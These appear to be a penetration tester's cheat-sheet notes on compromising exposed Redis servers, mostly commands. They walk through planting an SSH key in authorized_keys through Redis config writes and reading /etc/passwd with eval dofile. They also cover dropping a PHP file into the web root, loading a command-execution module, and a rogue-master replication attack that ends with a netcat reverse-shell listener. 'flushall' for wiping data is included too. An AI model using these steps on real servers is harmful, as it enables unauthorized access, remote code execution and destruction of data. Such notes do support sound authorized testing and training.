In the output of config get * you could find the home of the redis user (usually /var/lib/redis or /home/redis/.ssh), and knowing this you know where you can write the authenticated_users file to access via ssh with the user redis. If you know the home of other valid user where you have writable permissions you can also abuse it:

Generate a ssh public-private key pair on your pc: ssh-keygen -t rsa
Write the public key to a file : (echo -e "\n\n"; cat ./.ssh/id_rsa.pub; echo -e "\n\n") > foo.txt
Import the file into redis : cat foo.txt | redis-cli -h 10.10.10.10 -x set crackit 
Save the public key to the authorized_keys file on redis server:

root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /home/test/.ssh/
OK
10.85.0.52:6379> config set dbfilename "authorized_keys"
OK
10.85.0.52:6379> save
OK


- redis(6379):
    - Access with no password
        > redis-cli -h 192.168.91.93
    _ Access with password
        > redis-cli -h 192.168.91.93 -a MyPaSWoRd123
    - Commands
        - Delete all keys in database
            > flushall
        - Check database size
            > dbsize
        - seach for a directory path
            > config get dir <directory path>
        - dofile check files
            > redis-cli -h 192.168.91.93 -p 6379 eval "dofile('/etc/passwd')" 0
                - Try varations
                    > EVAL dofile('/etc/passwd') 0
    - web shell
        - List of commands: https://redis.io/commands/info
        > redis-cli -h 192.168.187.69
        > info
        > config set dir /var/www/html
        > config set dbfilename redis.php
        > set test "<?php phpinfo(); ?>"
        > save
        - now access the site to see if if the file is avaialble 
    - ssh key load
    - cronjob 
    - module load
        - On kali the directory ~/Downloads/GITHUBSTUFF/RedisModules-ExecuteCommand alread has the module.so compiled.
        - upload it to the server, and run this in redis
            > flushall
            > MODULE LOAD /location/of/module.so
            - Execut commands now with
            > system.exec "whoami"
    - master / slave (Works on only version 5.0.9 and lower
        - https://medium.com/@knownsec404team/rce-exploits-of-redis-based-on-master-slave-replication-ef7a664ce1d0
        > cd ~/Downloads/GITHUBSTUFF/redis-rouge-server
        - start reverse shell
            > nc -nlvp 8080
        - start attack
            > ./redis-rogue-server.py --rhost 192.168.228.69 --lhost 192.168.49.228 --lport 6379
                - Make sure "lport" is not being used by any other port.
                - Choose "r"
                - Choose your IP
                - Choose 8080 for port


